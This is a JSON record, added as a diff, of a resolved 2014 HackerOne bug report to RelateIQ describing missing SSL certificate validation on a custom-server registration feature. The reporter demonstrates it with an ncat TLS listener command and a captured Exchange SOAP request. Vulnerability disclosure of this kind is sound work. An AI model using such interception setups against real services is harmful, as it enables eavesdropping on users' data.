@@ -1,0 +1,112 @@
+{
+  "id": 16568,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjU2OA==",
+  "url": "https://hackerone.com/reports/16568",
+  "title": "Failed Certificate Validation On Custom Server (Register)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2014-06-15T15:54:42.012Z",
+  "submitted_at": "2014-06-15T15:54:42.012Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pum",
+    "url": "/pum",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/bbbf913458c48565d99f975f7ab9fc18ad1e989aa4f8811c1209ed725333d1ec"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 63,
+    "url": "https://hackerone.com/relateiq",
+    "handle": "relateiq",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/063/f6a77e2eca9387315acee66c4fb3a43a12a2db1e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/063/f6a77e2eca9387315acee66c4fb3a43a12a2db1e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "RelateIQ",
+      "twitter_handle": null,
+      "website": "https://www.relateiq.com/",
+      "about": "Goodbye, Relationship Management. Hello, Relationship Intelligence."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2014-08-25T15:18:13.940Z",
+  "bug_reporter_agreed_on_going_public_at": "2014-07-26T15:18:10.621Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\r\n\r\nin the register page a custom server can be used to define \"where to connect to\". Your system does not validate the SSL certificate of this host which makes it easy to tamper with the data your system do in behalf of the user.\r\n\r\nAs only SSL links are allowed by the application the user could assume that the implementation is according to security best practice and would validate the certificate trustchain on connect. Additional \"relateiq\" might can guarantee the security of any connection under control, but the connection made over insecure networks could be tampered by anyone with access to this system.\r\n\r\nI have used ncat which generates a certificate on the fly to demonstrate the issue:\r\n\r\nncat --ssl -p 443 -v -n -l\r\nNcat: Version 6.46 ( http://nmap.org/ncat )\r\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\r\nNcat: SHA-1 fingerprint: 541F EC41 71A1 BDDC D7AE DA96 8950 5584 4BC5 E9D3\r\nNcat: Listening on :::443\r\nNcat: Listening on 0.0.0.0:443\r\nNcat: Connection from 54.218.20.199.\r\nNcat: Connection from 54.218.20.199:53669.\r\nPOST / HTTP/1.1\r\nContent-Type: text/xml; charset=utf-8\r\nAccept: text/xml\r\nUser-Agent: ExchangeServicesClient/15.00.0516.014\r\nAccept-Encoding: gzip,deflate\r\nHost: pum.no-ip.org\r\nX-ClientStatistics: MessageId=0ba62fc8-5767-4578-b789-0951dcf8e559,ResponseTime=389,SoapAction=FindItem`1;\r\nContent-Length: 1464\r\nExpect: 100-continue\r\nConnection: Keep-Alive\r\n\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Header>\r\n    <t:RequestServerVersion Version=\"Exchange2007_SP1\" />\r\n    <t:TimeZoneContext>\r\n      <t:TimeZoneDefinition Id=\"Pacific Standard Time\" />\r\n    </t:TimeZoneContext>\r\n  </soap:Header>\r\n  <soap:Body>\r\n    <m:FindFolder Traversal=\"Shallow\">\r\n      <m:FolderShape>\r\n        <t:BaseShape>AllProperties</t:BaseShape>\r\n      </m:FolderShape>\r\n      <m:IndexedPageFolderView MaxEntriesReturned=\"1000\" Offset=\"0\" BasePoint=\"Beginning\" />\r\n      <m:Restriction>\r\n        <t:And>\r\n          <t:IsEqualTo>\r\n            <t:ExtendedFieldURI PropertyTag=\"13825\" PropertyType=\"Integer\" />\r\n            <t:FieldURIOrConstant>\r\n              <t:Constant Value=\"2\" />\r\n            </t:FieldURIOrConstant>\r\n          </t:IsEqualTo>\r\n          <t:IsEqualTo>\r\n            <t:FieldURI FieldURI=\"folder:DisplayName\" />\r\n            <t:FieldURIOrConstant>\r\n              <t:Constant Value=\"allitems\" />\r\n            </t:FieldURIOrConstant>\r\n          </t:IsEqualTo>\r\n        </t:And>\r\n      </m:Restriction>\r\n      <m:ParentFolderIds>\r\n        <t:DistinguishedFolderId Id=\"root\" />\r\n      </m:ParentFolderIds>\r\n    </m:FindFolder>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n\r\ncheers\r\n\r\npUm",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 11392,
+      "file_name": "Bildschirmfoto_2014-06-15_um_17.49.59.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/011/392/9d757e94af7db362951bc59c0f3c5702492f40d4/Bildschirmfoto_2014-06-15_um_17.49.59.PNG?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2014-06-15_um_17.49.59.PNG%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2014-06-15_um_17.49.59.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T112951Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a35233f0035a9ddff72c5e0e5cf442002bdd762edec299a74d1564f25cbe176b",
+      "file_size": 55932,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2014-08-25T15:18:11.014Z",
+  "allow_singular_disclosure_after": -298843900.1049043,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "shivammusic",
+    "muhaddix",
+    "0619"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
